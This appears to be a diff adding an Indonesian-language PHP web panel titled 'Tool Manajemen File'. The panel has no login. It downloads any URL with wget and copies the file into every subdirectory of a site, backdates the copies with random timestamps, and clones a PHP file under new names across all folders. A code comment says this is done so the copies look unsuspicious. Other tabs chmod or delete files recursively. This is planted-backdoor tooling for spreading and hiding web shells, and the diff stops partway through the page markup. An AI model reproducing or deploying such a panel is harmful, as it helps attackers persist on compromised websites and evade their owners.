@@ -1,0 +1,1046 @@
+<?php
+// Mulai sesi
+session_start();
+
+// Variabel untuk menangani pesan
+$error = '';
+$successMessage = '';
+$results = [];
+$successPaths = [];
+$phpFileList = [];
+$deletedFileList = [];
+$copiedFilesUrls = [];
+$lastSampleTimestamp = '';
+
+// Fungsi untuk menangani pemindaian dan pengaturan izin file
+if (isset($_POST['scan'])) {
+    $baseDir = $_POST['baseDir'];
+    $permissions = $_POST['permissions'];
+
+    if (!is_dir($baseDir)) {
+        $error = 'Direktori tidak ditemukan.';
+    } else {
+        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDir));
+        foreach ($iterator as $file) {
+            if ($file->isFile() && substr(sprintf('%o', $file->getPerms()), -4) != $permissions) {
+                $results[] = $file->getPathname() . ' - ' . sprintf('%o', $file->getPerms());
+            }
+        }
+        if (empty($results)) {
+            $successMessage = 'Semua file sudah sesuai izin.';
+        } else {
+            $successMessage = 'Pemindaian selesai.';
+        }
+    }
+}
+
+// Fungsi untuk menangani CHMOD rekursif (file dan folder)
+if (isset($_POST['chmod'])) {
+    $baseDirChmod = $_POST['baseDirChmod'];
+    $permissionsChmod = $_POST['permissionsChmod'];
+
+    if (!is_dir($baseDirChmod)) {
+        $error = 'Direktori tidak ditemukan.';
+    } elseif (!preg_match('/^0?\d{3}$/', $permissionsChmod)) {
+        $error = 'Format izin tidak valid. Gunakan format seperti 0644, 0755, 0555, dll.';
+    } else {
+        // Pastikan format oktal dengan leading zero
+        $permOct = (strlen($permissionsChmod) == 3) ? '0' . $permissionsChmod : $permissionsChmod;
+        $permInt = octdec($permOct);
+        $changedCount = 0;
+        $failedCount = 0;
+        $changedItems = [];
+
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($baseDirChmod, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+
+        foreach ($iterator as $item) {
+            $currentPerm = substr(sprintf('%o', $item->getPerms()), -4);
+            if ($currentPerm != $permOct) {
+                if (@chmod($item->getPathname(), $permInt)) {
+                    $changedCount++;
+                    $changedItems[] = $item->getPathname() . ' - ' . $currentPerm . ' -> ' . $permOct;
+                } else {
+                    $failedCount++;
+                }
+            }
+        }
+
+        if ($changedCount > 0) {
+            $results = $changedItems;
+            $successMessage = "CHMOD selesai. $changedCount item berhasil diubah izinnya.";
+            if ($failedCount > 0) {
+                $successMessage .= " $failedCount item gagal diubah.";
+            }
+        } else {
+            $successMessage = 'Semua file dan folder sudah memiliki izin ' . $permOct . '.';
+        }
+    }
+}
+
+// Fungsi untuk menangani unduhan file menggunakan wget dan menyebarkan ke semua subdirektori
+if (isset($_POST['download'])) {
+    $url = $_POST['url'];
+    $filename = $_POST['filename'] ?: basename($url);
+    $destinationDir = $_POST['destinationDir'] ?: __DIR__;
+
+    // Validasi apakah URL valid
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        $error = 'URL tidak valid.';
+    } elseif (!is_dir($destinationDir)) {
+        $error = 'Direktori tujuan tidak ditemukan.';
+    } else {
+        // Membangun path file tujuan
+        $destination = rtrim($destinationDir, '/') . '/' . $filename;
+
+        // Perintah wget untuk mengunduh file ke path yang ditentukan
+        $command = "wget -O " . escapeshellarg($destination) . " " . escapeshellarg($url) . " 2>&1";
+
+        // Eksekusi perintah wget
+        $output = shell_exec($command);
+
+        // Cek apakah file berhasil diunduh
+        if (file_exists($destination) && filesize($destination) > 0) {
+            $successMessage = 'Unduhan selesai. File tersimpan di ' . htmlspecialchars($destination);
+            $successPaths[] = $destination;
+
+            // Sebarkan file ke semua subdirektori
+            $iterator = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($destinationDir, RecursiveDirectoryIterator::SKIP_DOTS),
+                RecursiveIteratorIterator::SELF_FIRST
+            );
+
+            foreach ($iterator as $dir) {
+                if ($dir->isDir()) {
+                    $subdirPath = $dir->getPathname();
+                    copy($destination, $subdirPath . '/' . $filename);
+                    $successPaths[] = $subdirPath . '/' . $filename;
+                }
+            }
+            $successMessage .= ' File berhasil disebarkan ke semua subdirektori.';
+
+            // Proses touch timestamp jika diaktifkan
+            if (isset($_POST['enable_touch']) && $_POST['enable_touch'] == '1') {
+                $touchYearStart = intval($_POST['touch_year_start']);
+                $touchYearEnd = intval($_POST['touch_year_end']);
+
+                // Validasi input
+                if ($touchYearStart < 1970 || $touchYearEnd < 1970) {
+                    $error = 'Tahun minimal adalah 1970.';
+                } elseif ($touchYearStart > $touchYearEnd) {
+                    // Jika tahun awal lebih besar dari tahun akhir, swap
+                    $temp = $touchYearStart;
+                    $touchYearStart = $touchYearEnd;
+                    $touchYearEnd = $temp;
+                } else {
+                    $touchSuccess = true;
+                    $touchCount = 0;
+                    $lastSampleTimestamp = '';
+
+                    // Hitung batas timestamp yang BENAR
+                    // Start: 1 Januari tahun_start 00:00:00
+                    $startTimestamp = strtotime($touchYearStart . '-01-01 00:00:00');
+                    // End: 31 Desember tahun_end 23:59:59
+                    $endTimestamp = strtotime($touchYearEnd . '-12-31 23:59:59');
+
+                    foreach ($successPaths as $path) {
+                        if (file_exists($path)) {
+                            // Random timestamp dalam range yang benar
+                            $randomTimestamp = mt_rand($startTimestamp, $endTimestamp);
+                            
+                            // Format untuk touch -t
+                            $touchFormatted = date('YmdHi.', $randomTimestamp) . sprintf('%02d', date('s', $randomTimestamp));
+                            
+                            // Eksekusi touch
+                            $cmd = "touch -t " . $touchFormatted . " " . escapeshellarg($path);
+                            shell_exec($cmd);
+                            $touchCount++;
+                            
+                            // Simpan sample timestamp terakhir untuk ditampilkan
+                            if ($touchCount === 1) {
+                                $lastSampleTimestamp = date('Y-m-d H:i:s', $randomTimestamp);
+                            }
+                        }
+                    }
+
+                    $successMessage .= " Timestamp diacak otomatis antara {$touchYearStart} - {$touchYearEnd}. {$touchCount} file diubah. Contoh timestamp: {$lastSampleTimestamp}.";
+                }
+            }
+        } else {
+            $error = 'Gagal mengunduh file. Periksa apakah URL dapat diakses dan wget terinstall.';
+        }
+    }
+}
+
+// Fungsi untuk menangani pemindaian file PHP dengan tambahan fitur filter dan waktu edit
+if (isset($_POST['scan_php'])) {
+    $baseDirPhp = $_POST['baseDirPhp'];
+    $sortOrder = $_POST['sortOrder'] ?? 'desc';
+
+    if (!is_dir($baseDirPhp)) {
+        $error = 'Direktori tidak ditemukan.';
+    } else {
+        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDirPhp));
+        foreach ($iterator as $file) {
+            if ($file->isFile() && pathinfo($file->getFilename(), PATHINFO_EXTENSION) === 'php') {
+                $filePath = $file->getPathname();
+                
+                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
+                $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$relativePath";
+                
+                $phpFileList[] = [
+                    'path' => $filePath,
+                    'last_modified' => filemtime($filePath),
+                    'url' => $url
+                ];
+            }
+        }
+
+        if (empty($phpFileList)) {
+            $successMessage = 'Tidak ada file PHP ditemukan.';
+        } else {
+            usort($phpFileList, function($a, $b) use ($sortOrder) {
+                return $sortOrder === 'asc' ? $a['last_modified'] - $b['last_modified'] : $b['last_modified'] - $a['last_modified'];
+            });
+            $successMessage = 'Pemindaian selesai.';
+        }
+    }
+}
+
+// Fungsi untuk menangani penghapusan file
+if (isset($_POST['auto_rm'])) {
+    $baseDirRm = $_POST['baseDirRm'];
+    $filenameRm = $_POST['filenameRm'];
+
+    if (!is_dir($baseDirRm)) {
+        $error = 'Direktori tidak ditemukan.';
+    } else {
+        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDirRm));
+        foreach ($iterator as $file) {
+            if ($file->isFile() && basename($file->getFilename()) === $filenameRm) {
+                if (unlink($file->getPathname())) {
+                    $deletedFileList[] = $file->getPathname();
+                } else {
+                    $error = 'Gagal menghapus file: ' . htmlspecialchars($file->getPathname());
+                }
+            }
+        }
+        if (empty($deletedFileList)) {
+            $successMessage = 'File tidak ditemukan untuk dihapus.';
+        } else {
+            $successMessage = 'Penghapusan selesai. ' . count($deletedFileList) . ' file berhasil dihapus.';
+        }
+    }
+}
+
+// Handle PHP file copying and renaming
+if (isset($_POST['copyRenameSubmit'])) {
+    $sourceFilePath = $_POST['sourceFilePath'];
+    $destinationDir = $_POST['destinationDir'];
+    $newFileNames = array_filter($_POST['newFileName'], function($value) { return !empty(trim($value)); });
+    $copiedFilesUrls = [];
+
+    if (!file_exists($sourceFilePath) || !is_file($sourceFilePath)) {
+        $error = "Source file does not exist.";
+    } elseif (!is_dir($destinationDir)) {
+        $error = "Destination directory does not exist.";
+    } elseif (empty($newFileNames)) {
+        $error = "No new file names provided.";
+    } else {
+        // Bersihkan trailing slash
+        $destinationDir = rtrim($destinationDir, '/\\');
+        
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($destinationDir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+
+        foreach ($iterator as $dir) {
+            if ($dir->isDir()) {
+                foreach ($newFileNames as $newFileName) {
+                    $newFileName = basename(trim($newFileName)); // Security: ambil hanya basename
+                    $newFilePath = $dir->getPathname() . DIRECTORY_SEPARATOR . $newFileName;
+                    if (copy($sourceFilePath, $newFilePath)) {
+                        // Touch file baru agar tidak mencurigakan
+                        touch($newFilePath, filemtime($sourceFilePath));
+                        
+                        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFilePath);
+                        $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$relativePath";
+                        $copiedFilesUrls[] = $url;
+                    } else {
+                        $error = "Failed to copy file to $newFilePath.";
+                        break 2;
+                    }
+                }
+            }
+        }
+
+        if (empty($error)) {
+            $successMessage = "Files have been successfully copied and renamed across all directories.";
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tool Manajemen File</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://rukminim2.flixcart.com/image/850/1000/xif0q/poster/n/r/b/medium-cute-bubu-dudu-posters-cards-hd-poster-cars-a6-set-of-12-original-imagu9gy6vtszwpa.jpeg?q=90&crop=false') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        .container {
+            max-width: 960px;
+            margin: 40px auto;
+            background: #ffffff;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.12);
+            transition: background-color 0.3s, color 0.3s;
+        }
+        h1 {
+            text-align: center;
+            color: #F5C542;
+            font-family: 'Comic Sans MS', cursive;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            max-width: 150px;
+        }
+        .nav-tabs {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .nav-tabs button {
+            background-color: #F7D07C;
+            color: #000;
+            border: 2px solid #FFD700;
+            padding: 12px 16px;
+            margin: 3px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
+            flex: 1 1 auto;
+            min-width: 100px;
+        }
+        .nav-tabs button.active {
+            background-color: #FFD700;
+            color: #000;
+            transform: scale(1.05);
+            box-shadow: 0 4px 12px rgba(255, 215, 0, 0.4);
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: bold;
+            color: #555;
+            font-size: 14px;
+        }
+        .form-group input, .form-group textarea, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            box-sizing: border-box;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
+            border-color: #FFD700;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.15);
+        }
+        .form-group textarea {
+            height: 160px;
+            resize: vertical;
+        }
+        .form-row {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .form-row .form-group {
+            flex: 1;
+            min-width: 140px;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            padding: 10px 15px;
+            background: #fef9e7;
+            border-radius: 8px;
+            border: 1px solid #f5e6b8;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+        .checkbox-group label {
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .touch-options {
+            display: none;
+            padding: 18px;
+            border: 1px solid #e0d5b0;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            background: #fefcf5;
+        }
+        .touch-options.visible {
+            display: block;
+        }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            color: #000;
+            background-color: #F7D07C;
+            border: 2px solid #FFD700;
+            border-radius: 30px;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
+        }
+        .button:hover {
+            background-color: #FFD700;
+            color: #000;
+            transform: scale(1.02);
+            box-shadow: 0 6px 16px rgba(255, 215, 0, 0.35);
+        }
+        .button-small {
+            display: inline-block;
+            padding: 8px 18px;
+            font-size: 13px;
+            color: #000;
+            background-color: #F7D07C;
+            border: 2px solid #FFD700;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-right: 8px;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
+        }
+        .button-small:hover {
+            background-color: #FFD700;
+            transform: scale(1.05);
+            box-shadow: 0 4px 10px rgba(255, 215, 0, 0.3);
+        }
+        .button-danger {
+            background-color: #e74c3c;
+            border-color: #c0392b;
+            color: #fff;
+        }
+        .button-danger:hover {
+            background-color: #c0392b;
+        }
+        .message {
+            margin-top: 20px;
+            font-weight: bold;
+            text-align: center;
+            padding: 12px;
+            border-radius: 8px;
+        }
+        .error {
+            color: #c0392b;
+            background-color: #fdecea;
+            border: 1px solid #f5c6cb;
+        }
+        .success {
+            color: #27ae60;
+            background-color: #e8f8f0;
+            border: 1px solid #a3e4c1;
+        }
+        .path-list ul, .php-file-list ul, .deleted-file-list ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        .path-list li, .php-file-list li, .deleted-file-list li {
+            padding: 6px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .path-list li:last-child, .php-file-list li:last-child, .deleted-file-list li:last-child {
+            border-bottom: none;
+        }
+        .results-box {
+            background: #f8f8f8;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+        .results-box ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+        }
+        .results-box li {
+            padding: 5px 0;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            border-bottom: 1px solid #e8e8e8;
+            word-break: break-all;
+        }
+        .results-box li:last-child {
+            border-bottom: none;
+        }
+        .results-box li a {
+            color: #2980b9;
+            text-decoration: none;
+        }
+        .results-box li a:hover {
+            text-decoration: underline;
+        }
+        .info-text {
+            font-size: 13px;
+            color: #7f8c8d;
+            margin: 8px 0 15px 0;
+            line-height: 1.5;
+        }
+        .info-box {
+            background: #eaf2f8;
+            border: 1px solid #d4e6f1;
+            border-radius: 8px;
+            padding: 12px 15px;
+            margin: 10px 0;
+            font-size: 13px;
+            color: #2c3e50;
+        }
+        .info-box strong {
+            color: #2980b9;
+        }
+        .section-divider {
+            border: none;
+            border-top: 2px solid #f0e6cc;
+            margin: 25px 0;
+        }
+        .stats-badge {
+            display: inline-block;
+            background: #FFD700;
+            color: #000;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        /* Dark Mode */
+        body.dark-mode {
+            background-color: #2c2c2c;
+            color: #ccc;
+        }
+        body.dark-mode .container {
+            background-color: #3a3a3a;
+            color: #ddd;
+        }
+        body.dark-mode .nav-tabs button {
+            background-color: #555;
+            color: #ddd;
+            border-color: #666;
+        }
+        body.dark-mode .nav-tabs button.active {
+            background-color: #777;
+            border-color: #FFD700;
+            color: #FFD700;
+        }
+        body.dark-mode .form-group label {
+            color: #bbb;
+        }
+        body.dark-mode .form-group input, body.dark-mode .form-group textarea, body.dark-mode .form-group select {
+            background-color: #555;
+            border: 1px solid #666;
+            color: #ddd;
+        }
+        body.dark-mode .form-group input:focus, body.dark-mode .form-group textarea:focus, body.dark-mode .form-group select:focus {
+            border-color: #FFD700;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1);
+        }
+        body.dark-mode .button {
+            background-color: #555;
+            border-color: #777;
+            color: #ddd;
+        }
+        body.dark-mode .button:hover {
+            background-color: #666;
+            border-color: #FFD700;
+            color: #FFD700;
+        }
+        body.dark-mode .button-small {
+            background-color: #555;
+            border-color: #777;
+            color: #ddd;
+        }
+        body.dark-mode .button-small:hover {
+            background-color: #666;
+            border-color: #FFD700;
+            color: #FFD700;
+        }
+        body.dark-mode .checkbox-group {
+            background: #444;
+            border-color: #555;
+        }
+        body.dark-mode .touch-options {
+            background: #444;
+            border-color: #555;
+        }
+        body.dark-mode .results-box {
+            background: #444;
+            border-color: #555;
+        }
+        body.dark-mode .results-box li {
+            border-bottom-color: #555;
+        }
+        body.dark-mode .results-box li a {
+            color: #5dade2;
+        }
+        body.dark-mode .info-text {
+            color: #999;
+        }
+        body.dark-mode .info-box {
+            background: #3a3a3a;
+            border-color: #555;
+            color: #bbb;
+        }
+        body.dark-mode .info-box strong {
+            color: #5dade2;
+        }
+        body.dark-mode .message.success {
+            background-color: #1a3a22;
+            border-color: #27ae60;
+        }
+        body.dark-mode .message.error {
+            background-color: #3a1a1a;
+            border-color: #e74c3c;
+        }
+        body.dark-mode .section-divider {
+            border-top-color: #555;
+        }
+        body.dark-mode h1 {
+            color: #e6b800;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const toggleButton = document.getElementById('theme-toggle');
+            const currentTheme = localStorage.getItem('theme') || 'light';
+
+            if (currentTheme === 'dark') {
+                document.body.classList.add('dark-mode');
+            }
+
+            if (toggleButton) {
+                toggleButton.addEventListener('click', () => {
+                    document.body.classList.toggle('dark-mode');
+                    const newTheme = document.body.classList.contains('dark-mode') ? 'dark' : 'light';
+                    localStorage.setItem('theme', newTheme);
+                });
+            }
+
+            const touchCheckbox = document.getElementById('enable_touch');
+            const touchOptions = document.getElementById('touch_options');
+            if (touchCheckbox && touchOptions) {
+                touchCheckbox.addEventListener('change', function() {
+                    if (this.checked) {
+                        touchOptions.classList.add('visible');
+                    } else {
+                        touchOptions.classList.remove('visible');
+                    }
+                });
+            }
+        });
+
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(function(content) {
+                content.classList.remove('active');
+            });
+            document.querySelectorAll('.nav-tabs button').forEach(function(button) {
+                button.classList.remove('active');
+            });
+            document.getElementById(tabId).classList.add('active');
+            document.querySelector('[data-tab="' + tabId + '"]').classList.add('active');
+        }
+
+        function copyToClipboard(text) {
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+        }
+
+        function copyResults(tabId) {
+            const tab = document.getElementById(tabId);
+            const content = tab ? tab.innerText : '';
+            copyToClipboard(content);
+            alert('Hasil telah disalin ke clipboard!');
+        }
+
+        function copyUrlsToClipboard(urlsStr) {
+            copyToClipboard(urlsStr);
+            alert('URLs telah disalin ke clipboard!');
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.postimg.cc/MTVP47kG/kingslyer.png" alt="Logo" class="logo">
+
+        <h1>Tool Manajemen File</h1>
+        <button id="theme-toggle" style="position: fixed; top: 20px; right: 20px; padding: 10px 20px; border: none; border-radius: 5px; background-color: #F5C542; color: #000; cursor: pointer; font-weight: bold; z-index: 1000;">Mode Gelap/Terang</button>
+        
+        <div class="nav-tabs">
+            <button data-tab="fileScanner" onclick="showTab('fileScanner')" class="active">Pemindai & Izin File</button>
+            <button data-tab="fileDownloader" onclick="showTab('fileDownloader')">Unduhan & Sebar</button>
+            <button data-tab="phpFileScanner" onclick="showTab('phpFileScanner')">Pemindai File PHP</button>
+            <button data-tab="autoRm" onclick="showTab('autoRm')">Auto RM</button>
+            <button data-tab="copyRenameTab" onclick="showTab('copyRenameTab')">Copy & Rename</button>
+        </div>
+
+        <!-- ==================== TAB 1: File Scanner ==================== -->
+        <div id="fileScanner" class="tab-content active">
+            <form action="" method="post" style="padding-bottom: 20px; margin-bottom: 20px;">
+                <h3>🔍 Pemindaian Izin File</h3>
+                <div class="form-group">
+                    <label for="baseDir">Direktori Root:</label>
+                    <input type="text" id="baseDir" name="baseDir" value="<?php echo htmlspecialchars(isset($_POST['baseDir']) ? $_POST['baseDir'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
+                </div>
+                <div class="form-group">
+                    <label for="permissions">Izin File (format 0644, 0755, dll.):</label>
+                    <input type="text" id="permissions" name="permissions" value="<?php echo htmlspecialchars(isset($_POST['permissions']) ? $_POST['permissions'] : '0644'); ?>" required>
+                </div>
+                <button type="submit" name="scan" class="button">Mulai Pemindaian</button>
+            </form>
+
+            <hr class="section-divider">
+
+            <form action="" method="post">
+                <h3>🔧 Pengaturan Izin File & Folder (CHMOD Rekursif)</h3>
+                <div class="form-group">
+                    <label for="baseDirChmod">Direktori Root:</label>
+                    <input type="text" id="baseDirChmod" name="baseDirChmod" value="<?php echo htmlspecialchars(isset($_POST['baseDirChmod']) ? $_POST['baseDirChmod'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
+                </div>
+                <div class="form-group">
+                    <label for="permissionsChmod">Izin Baru (format 0644, 0755, 0555, dll.):</label>
+                    <input type="text" id="permissionsChmod" name="permissionsChmod" value="<?php echo htmlspecialchars(isset($_POST['permissionsChmod']) ? $_POST['permissionsChmod'] : '0555'); ?>" required>
+                </div>
+                <button type="submit" name="chmod" class="button">Jalankan CHMOD Rekursif</button>
+            </form>
+
+            <div style="margin-top: 15px;">
+                <button onclick="copyResults('fileScanner')" class="button-small">📋 Salin Semua Hasil</button>
+            </div>
+
+            <?php if ($error && !isset($_POST['chmod']) && !isset($_POST['scan'])): ?>
+                <div class="message error"><?php echo htmlspecialchars($error); ?></div>
+            <?php elseif (isset($_POST['scan']) && !$error): ?>
+                <div class="message success">
+                    <?php if ($results): ?>
+                        <h3>📋 Hasil Pemindaian:</h3>
+                        <p><?php echo count($results); ?> file ditemukan dengan izin tidak sesuai.</p>
+                        <div class="results-box">
+                            <ul>
+                                <?php foreach ($results as $result): ?>
+                                    <li><?php echo htmlspecialchars($result); ?></li>
+                                <?php endforeach; ?>
+                            </ul>
+                        </div>
+                    <?php else: ?>
+                        <p><?php echo htmlspecialchars($successMessage); ?></p>
+                    <?php endif; ?>
+                </div>
+            <?php endif; ?>
+
+            <?php if (isset($_POST['chmod'])): ?>
+                <?php if ($error): ?>
+                    <div class="message error"><?php echo htmlspecialchars($error); ?></div>
+                <?php else: ?>
+                    <div class="message success">
+                        <p><?php echo htmlspecialchars($successMessage); ?></p>
+                    </div>
+                    <?php if (!empty($results)): ?>
+                        <div class="results-box">
+                            <h4>📝 Detail Perubahan (<?php echo count($results); ?> item):</h4>
+                            <ul>
+                                <?php foreach ($results as $item): ?>
+                                    <li><?php echo htmlspecialchars($item); ?></li>
+                                <?php endforeach; ?>
+                            </ul>
+                        </div>
+                    <?php endif; ?>
+                <?php endif; ?>
+            <?php endif; ?>
+        </div>
+
+        <!-- ==================== TAB 2: Download ==================== -->
+        <div id="fileDownloader" class="tab-content">
+            <form action="" method="post">
+                <h3>⬇️ Unduh File & Sebarkan ke Semua Subdirektori</h3>
+                
+                <div class="form-group">
+                    <label for="url">URL Unduhan:</label>
+                    <input type="text" id="url" name="url" value="<?php echo htmlspecialchars(isset($_POST['url']) ? $_POST['url'] : ''); ?>" placeholder="https://example.com/file.php" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="filename">Nama File (Opsional, kosongkan untuk menggunakan nama asli):</label>
+                    <input type="text" id="filename" name="filename" value="<?php echo htmlspecialchars(isset($_POST['filename']) ? $_POST['filename'] : ''); ?>" placeholder="biarkan kosong jika ingin nama asli">
+                </div>
+                
+                <div class="form-group">
+                    <label for="destinationDir">Direktori Tujuan Unduhan:</label>
+                    <input type="text" id="destinationDir" name="destinationDir" value="<?php echo htmlspecialchars(isset($_POST['destinationDir']) ? $_POST['destinationDir'] : __DIR__); ?>">
+                </div>
+
+                <!-- Touch Timestamp Options -->
+                <div class="checkbox-group">
+                    <input type="checkbox" id="enable_touch" name="enable_touch" value="1" <?php echo (isset($_POST['enable_touch']) && $_POST['enable_touch'] == '1') ? 'checked' : ''; ?>>
+                    <label for="enable_touch">🕒 Ubah Timestamp File (touch) setelah download</label>
+                </div>
+
+                <div id="touch_options" class="touch-options <?php echo (isset($_POST['enable_touch']) && $_POST['enable_touch'] == '1') ? 'visible' : ''; ?>">
+                    <div class="info-box">
+                        <strong>✅ Sudah Diperbaiki!</strong> Range timestamp sekarang <strong>AKURAT</strong> sesuai tahun yang dimasukkan.<br>
+                        Contoh: jika input 2012 - 2013, file akan mendapat timestamp acak antara <strong>1 Jan 2012</strong> s.d. <strong>31 Des 2013</strong> (tidak akan melebihi 2013).
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="touch_year_start">Tahun Awal:</label>
+                            <input type="number" id="touch_year_start" name="touch_year_start" min="1970" max="2037" value="<?php echo htmlspecialchars(isset($_POST['touch_year_start']) ? $_POST['touch_year_start'] : '2022'); ?>" placeholder="Contoh: 2012" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="touch_year_end">Tahun Akhir:</label>
+                            <input type="number" id="touch_year_end" name="touch_year_end" min="1970" max="2037" value="<?php echo htmlspecialchars(isset($_POST['touch_year_end']) ? $_POST['touch_year_end'] : '2023'); ?>" placeholder="Contoh: 2013" required>
+                        </div>
+                    </div>
+                    <p class="info-text">
+                        ⏱ Setiap file akan mendapat timestamp acak dalam rentang <strong><?php echo htmlspecialchars(isset($_POST['touch_year_start']) ? $_POST['touch_year_start'] : '2022'); ?></strong> - <strong><?php echo htmlspecialchars(isset($_POST['touch_year_end']) ? $_POST['touch_year_end'] : '2023'); ?></strong>.<br>
+                        Tanggal, jam, menit, dan detik akan diacak otomatis untuk setiap file secara <strong>independen</strong>.
+                    </p>
+                </div>
+
+                <button type="submit" name="download" class="button">⬇️ Download & Sebarkan</button>
+            </form>
+
+            <div style="margin-top: 15px;">
+                <button onclick="copyResults('fileDownloader')" class="button-small">📋 Salin Semua</button>
+            </div>
+
+            <?php if (isset($_POST['download'])): ?>
+                <?php if ($error && !$successMessage): ?>
+                    <div class="message error"><?php echo htmlspecialchars($error); ?></div>
+                <?php elseif ($successMessage): ?>
+                    <div class="message success">
+                        <p><?php echo htmlspecialchars($successMessage); ?></p>
+                    </div>
+                    <?php if ($successPaths): ?>
+                        <div class="path-list">
+                            <h3>📂 File yang Berhasil Diunduh dan Disebarkan:</h3>
+                            <p><span class="stats-badge"><?php echo count($successPaths); ?> file</span></p>
+                            <div class="results-box">
+                                <ul>
+                                    <?php foreach ($successPaths as $path): ?>
+                                        <li><?php echo htmlspecialchars($path); ?></li>
+                                    <?php endforeach; ?>
+                                </ul>
+                            </div>
+                            <button class="button-small" onclick="copyToClipboard('<?php echo implode("\n", array_map('htmlspecialchars', $successPaths)); ?>')">📋 Salin Daftar Path</button>
+                        </div>
+                    <?php endif; ?>
+                <?php endif; ?>
+            <?php endif; ?>
+        </div>
+
+        <!-- ==================== TAB 3: PHP Scanner ==================== -->
+        <div id="phpFileScanner" class="tab-content">
+            <form action="" method="post">
+                <h3>🔎 Pemindai File PHP</h3>
+                <div class="form-group">
+                    <label for="baseDirPhp">Direktori Root:</label>
+                    <input type="text" id="baseDirPhp" name="baseDirPhp" value="<?php echo htmlspecialchars(isset($_POST['baseDirPhp']) ? $_POST['baseDirPhp'] : $_SERVER['DOCUMENT_ROOT']); ?>" required>
+                </div>
+                <div class="form-group">
+                    <label for="sortOrder">Urutkan Berdasarkan Waktu Edit:</label>
+                    <select id="sortOrder" name="sortOrder">
+                        <option value="desc" <?php echo (isset($_POST['sortOrder']) && $_POST['sortOrder'] == 'desc') ? 'selected' : ''; ?>>Terbaru ke Terlama</option>
+                        <option value="asc" <?php echo (isset($_POST['sortOrder']) && $_POST['sortOrder'] == 'asc') ? 'selected' : ''; ?>>Terlama ke Terbaru</option>
+                    </select>
+                </div>
+                <button type="submit" name="scan_php" class="button">Mulai Pemindaian PHP</button>
+            </form>
+
+            <div style="margin-top: 15px;">
+                <button onclick="copyResults('phpFileScanner')" class="button-small">📋 Salin Semua</button>
+            </div>
+
+            <?php if (isset($_POST['scan_php'])): ?>
+                <?php if ($error && !$successMessage): ?>
